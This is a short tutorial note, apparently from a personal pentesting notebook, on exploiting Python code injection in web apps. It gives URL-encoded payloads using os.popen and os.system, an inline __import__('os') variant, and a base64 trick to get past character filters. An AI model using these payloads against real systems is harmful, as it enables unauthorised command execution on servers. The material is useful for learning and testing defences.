---
language: python
exploit: "command-injection"
tags: python
---

To make sure what we have is a python application, we can first input a double quote (sometimes simple quote?) to receive an error. 

The error text probably won’t be useful, but the fact that we got an error is useful.

Now, we have to make sure it’s a python app, because a lot of other vulnerabilities could cause an error if we input a double quote.

```ad-caution
You do have to encode the double quotes to `%22` and you are better off encoding plus signs too `%2b`!
```

The best way to test is to use `str(True)` since if both of them are available that probably means it’s a python app.

Now you just have to exploit this by running `os.system('[command]')`
Single quotes because double quotes would break.

In case we want to return the result of the command we run, we have to use `os.popen('[command]').read()`

So a final exploit would look something like this:

```url
http://url.me/hello/world%22+os.popen('whoami').read()+%22
```



```ad-warning
This only works if OS is imported, and that's rare. Keep reading for a solution!
```

## In-line importing

So what if OS is not imported, well simple, since it’s a package that’s available on most if not all systems, we can just import it by doing:

```python
__import__('os').system('[evil_command]')
```

## Base64 char bypass

And what do we do when paths are not allowed? They usually restrict the `/` char, so we have to bypass it, for example with b64 encoding.

Let’s put this together with the previous thing we learned. The [[#In-line importing]]. 

First, we import the os as usual: 
```python
__import__('os').popen([ournewpayload]).read()
```

We also used `popen` so we can read out the data we get back.

Now let’s use `b64decode` to bypass the character limitations:

```python
__import__('base64').b64decode('[whatever command base64d]')
```

And put together:

```python
__import__('os').popen(__import__('base64').b64decode('[whatever command base64d]')).read()
```

aaand done, we put this into the url or wherever we found the injection.